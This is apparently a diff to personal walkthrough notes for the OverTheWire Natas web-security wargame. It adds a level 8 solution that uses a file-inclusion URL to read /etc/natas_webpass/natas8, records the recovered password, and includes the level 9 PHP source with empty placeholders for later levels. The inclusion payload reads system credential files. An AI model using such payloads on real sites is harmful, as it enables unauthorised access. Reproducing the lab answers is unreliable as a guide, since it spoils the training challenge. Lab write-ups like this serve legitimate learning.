@@ -120,40 +120,102 @@ Access granted. The password for natas7 is jmxSiH3SP6Sonf8dv66ng8v1cIEdjXWr
 
 lvl 8:
 -----------
-
-
+click home / about
+->
+http://natas7.natas.labs.overthewire.org/index.php?page=home
+->
+<!-- hint: password for webuser natas8 is in /etc/natas_webpass/natas8 -->
+->
+/etc/natas_webpass/natas8
+->
+http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8
+->
+a6bZCNYwdKqN5cGP11ZdtPg0iImQQhAB 
 
 
 lvl 9:
 -----------
 
+->
+click View sourcecode
+->
+
+<?
+
+$encodedSecret = "3d3d516343746d4d6d6c315669563362";
+
+function encodeSecret($secret) {
+    return bin2hex(strrev(base64_encode($secret)));
+}
+
+if(array_key_exists("submit", $_POST)) {
+    if(encodeSecret($_POST['secret']) == $encodedSecret) {
+    print "Access granted. The password for natas9 is <censored>";
+    } else {
+    print "Wrong secret";
+    }
+}
+?>
+
+->
+
+->
+->
+->
+->
+
 
 lvl 10:
 -----------
 
+->
+->
+->
+->
+->
 
 lvl 11:
 -----------
-
+->
+->
+->
+->
+->
 
 lvl 12:
 -----------
 
-
+->
+->
+->
+->
+->
 
 lvl 13:
 -----------
 
-
+->
+->
+->
+->
+->
 
 lvl 14:
 -----------
 
-
+->
+->
+->
+->
+->
 
 lvl 15:
 -----------
-
+->
+->
+->
+->
+->
 
 lvl 16:
 -----------
